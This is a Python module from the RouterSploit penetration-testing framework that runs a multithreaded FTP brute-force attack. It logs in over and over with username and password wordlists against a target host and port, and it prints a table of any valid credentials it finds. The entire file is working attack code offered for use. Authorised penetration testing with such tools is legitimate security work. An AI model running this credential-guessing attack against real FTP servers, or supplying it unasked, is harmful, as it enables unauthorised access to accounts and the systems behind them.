import itertools
from routersploit.core.exploit import *
from routersploit.core.ftp.ftp_client import FTPClient
from routersploit.resources import wordlists


class Exploit(FTPClient):
    __info__ = {
        "name": "FTP Bruteforce",
        "description": "Module performs bruteforce attack against FTP service."
                       "If valid credentials are found, the are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(8, "Number of threads")
    usernames = OptWordlist("admin", "Username or file with usernames (file://)")
    passwords = OptWordlist(wordlists.passwords, "Password or file with passwords (file://)")

    verbosity = OptBool("true", "Display authentication attempts")
    stop_on_success = OptBool("true", "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting bruteforce attack against FTP service")

        data = LockedIterator(itertools.product(self.usernames, self.passwords))
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next()
            except StopIteration:
                break
            else:
                ftp = self.ftp_connect(retries=3)
                if ftp is None:
                    print_error("Too many connections problems. Quiting...", verbose=self.verbosity)
                    return

                try:
                    ftp.login(username, password)

                    if self.stop_on_success:
                        running.clear()

                    print_success("Authenticated Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))

                except Exception as err:
                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

                ftp.close()

    def check(self):
        if self.ftp_test_connect():
            print_status("Target exposes FTP service", verbose=self.verbosity)
            return True

        print_status("Target does not expose FTP service", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(itertools.product(self.usernames, self.passwords))
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
